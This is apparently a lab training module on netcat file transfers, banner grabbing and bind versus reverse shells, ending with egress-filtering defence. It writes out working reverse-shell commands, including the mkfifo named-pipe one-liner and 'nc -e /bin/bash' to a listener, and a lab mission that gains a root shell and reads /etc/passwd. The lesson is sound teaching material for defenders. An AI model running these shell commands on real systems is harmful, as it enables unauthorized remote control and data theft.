# 06.02: File Transfers, Banner Grabbing & Shell Mechanics

**Level:** 🟡 Intermediate | **Time:** 1.5 h | **XP:** 100

## 🎯 Learning Objectives
- Stream files and compressed archives across networks using standard Unix redirection
- Manually interact with application protocols (HTTP, SMTP, FTP) via banner grabbing
- Master the technical difference between **Bind Shells** and **Reverse Shells**
- Analyze the packet signatures of interactive remote shells in Wireshark
- Implement enterprise **Egress Filtering** to neutralize reverse shells

---

## 1. Network File Transfers with Netcat

Netcat can transfer files directly across sockets without requiring FTP, SSH, or SMB credentials:

```
Sender (Kali)                                          Receiver (Ubuntu)
  cat file.tar.gz ──► nc 10.10.10.20 9000 ══════════► nc -lvnp 9000 > file.tar.gz
```

### 1.1 Step-by-Step File Transfer:
1. **Receiver (starts first):**
   ```bash
   nc -lvnp 9000 > received_backup.tar.gz
   ```
2. **Sender:**
   ```bash
   nc -vn 10.10.10.20 9000 < local_backup.tar.gz
   ```
*(When the sender finishes reading the file, it closes the socket, and the receiver automatically finishes writing).*

### 1.2 Streaming Entire Directories on the Fly (Tar Piping):
```bash
# Receiver: extracts files on arrival
nc -lvnp 9000 | tar -xzvf -

# Sender: compresses directory and streams it into the socket
tar -czvf - /var/log/ | nc -vn 10.10.10.20 9000
```

---

## 2. Interactive Banner Grabbing

Security analysts use Netcat to manually simulate clients and observe exact raw server responses:

### 2.1 HTTP Request via Netcat:
```bash
printf "HEAD / HTTP/1.1\r\nHost: 10.10.10.20\r\nConnection: close\r\n\r\n" | nc 10.10.10.20 80
```
**Output reveals:** Web server software, exact version, OS platform, and PHP/Python headers.

### 2.2 SMTP Interaction via Netcat:
```bash
nc 10.10.10.20 25
# Type: EHLO kali.lab.local
# Type: VRFY student
# Type: QUIT
```

---

## 3. Remote Shell Mechanics: Bind vs. Reverse Shells

Understanding shell mechanics is mandatory for network security analysts and SOC defenders.

```
                     ┌───────────────────┐
                     │ BIND SHELL        │
                     │ Target listens    │ ◄─── Attacker connects in
                     └───────────────────┘      (Blocked by inbound firewall!)

                     ┌───────────────────┐
                     │ REVERSE SHELL     │
Attacker listens ◄── │ Target dials out  │      (Bypasses inbound firewalls!)
                     └───────────────────┘
```

### 3.1 The Bind Shell
The target system runs a listener and ties its shell (`/bin/bash` or `cmd.exe`) to the port:
```bash
# On Target:
nc -lvnp 4444 -e /bin/bash

# Attacker connects:
nc <target_ip> 4444
```
**The Defense:** Corporate perimeter firewalls block all inbound unsolicited traffic by default, rendering bind shells useless from the internet.

### 3.2 The Reverse Shell (The #1 Attacker Tactic)
The attacker sets up a listener on their own machine, and tricks the target (via exploit or phishing) into connecting **outbound** to the attacker:
```bash
# On Attacker (Kali):
nc -lvnp 4444

# On Target (Metasploitable2):
nc 10.10.10.10 4444 -e /bin/bash
```

### Why Reverse Shells Succeed:
Perimeter firewalls almost always allow outbound traffic on standard ports (like 80, 443, or 53). If the attacker runs their listener on port 443, the outbound connection looks like standard HTTPS web browsing to an uninspected firewall!

### 3.3 Reverse Shell without `-e` (The FIFO Named Pipe Trick)
Modern Netcat binaries on Linux intentionally strip the `-e` flag for security. Attackers bypass this using a Unix named pipe:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

---

## 4. 🎯 Mission: Capture an Interactive Reverse Shell

### Step 1: Set up the Listener on Kali
1. On **Kali**, launch Wireshark on `eth0`, filter: `tcp.port == 4444`.
2. In Kali terminal, start the listener:
   ```bash
   nc -lvnp 4444
   ```

### Step 2: Trigger the Reverse Shell from Metasploitable2
On **metasploitable2**:
```bash
nc 10.10.10.10 4444 -e /bin/sh
```

### Step 3: Execute Commands through the Shell
Look back at your Kali terminal:
You have a root shell on Metasploitable2!
```bash
whoami
uname -a
id
cat /etc/passwd | head -3
exit
```

### Step 4: Analyze the Attack in Wireshark
1. Stop capture in Wireshark.
2. Filter: `tcp.port == 4444`.
3. Right-click any packet ➔ **Follow ➔ TCP Stream**:
   - Notice that every command you typed (`whoami`, `uname -a`) was transmitted across the network in completely unencrypted cleartext!
   - Every system username, process output, and command return value is fully legible.

---

## 💼 Business Corner: Egress Filtering (Outbound Firewall Rules)
Most enterprise IT organizations focus 95% of their security budget on **Ingress Filtering** (blocking incoming connections from the internet).

However, **Egress Filtering** (restricting outbound connections leaving the enterprise) is what neutralizes ransomware and data exfiltration:

### Modern Zero-Trust Egress Architecture:
1. **Default Deny Outbound:** Servers in data centers and DMZs should have **zero direct access** to the internet.
2. **Explicit Whitelisting:** If a Linux database server needs updates, it may only connect to an internal proxy (`proxy.corp.local:8080`).
3. **Block Non-Standard Outbound Ports:** If a compromised server attempts an outbound reverse shell connection to `203.0.113.50:4444`, the perimeter firewall drops the packet immediately and triggers a Priority 1 SIEM alert.

---

## 🧠 Knowledge Check
1. Why do attackers prefer reverse shells over bind shells?
2. How do you stream an entire directory compressed across a Netcat socket?
3. How can an attacker establish a reverse shell if the installed Netcat binary lacks the `-e` option?
4. What defensive network control prevents a reverse shell from reaching an external attacker's listener?

<details><summary>Answers</summary>

1. Reverse shells initiate outbound connections, which easily bypass typical perimeter firewalls and NAT that block unsolicited inbound connections.
2. `tar -czf - /path/to/dir | nc <ip> <port>` on the sender, and `nc -l -p <port> | tar -xzf -` on the receiver.
3. By creating a Unix FIFO named pipe (`mkfifo /tmp/f`) to redirect standard input and output between `/bin/sh` and `nc`.
4. Strict Egress Filtering (restricting outbound traffic to approved enterprise proxies and authorized destinations).
</details>

---
⬅️ [01 Netcat Basics](01-netcat-basics.md) | ➡️ [03 Ncat, Socat & Encryption](03-ncat-socat-encryption.md)
